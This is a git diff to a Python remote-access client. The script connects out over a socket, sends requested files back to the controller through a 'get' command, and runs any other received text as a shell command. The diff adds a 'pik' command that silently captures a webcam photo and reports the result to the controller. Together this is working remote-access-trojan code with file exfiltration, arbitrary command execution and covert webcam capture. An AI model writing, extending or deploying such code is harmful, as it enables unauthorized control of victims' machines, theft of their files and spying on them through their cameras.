@@ -1,9 +1,11 @@
 import socket
 import subprocess
 import os
+import cv2
 
 #############################################################
-############################################################
+################   CODE FOR 'get' command   #################
+#############################################################
 def send_file(client_socket, filename):
     """Sends a file over the socket."""
     try:
@@ -27,7 +29,28 @@ def send_file(client_socket, filename):
 
 
 ############################################################
-#########################################################
+############# CODE FOR 'pik'  COMMAND #####################
+############################################################
+
+def take_pick():
+    cam_port = 0
+    cam = cv2.VideoCapture(cam_port) 
+
+    # reading the input using the camera 
+    result, image = cam.read() 
+
+    # If image will detected without any error, 
+    # show result 
+    if result: 
+
+        cv2.imwrite("taken_image_shot.png", image) 
+        s.send(str.encode("image capectured")) 
+    else: 
+        s.send(str.encode("No image detected. Please! try again"))
+    
+
+############################################################
+############################################################
 
 s = socket.socket()
 global host 
@@ -60,6 +83,8 @@ while True:
             s.send(str.encode("("+ str(IPAddr) + ")"+ str(os.getcwd()) +"> "))
     elif data[:3].decode("utf-8") == "get":
         send_file(s,data[4:].decode("utf-8"))  
+    elif data[:3].decode("utf-8") == "pik":
+        take_pick()
     elif len(data)>0: 
     
         cmd = subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
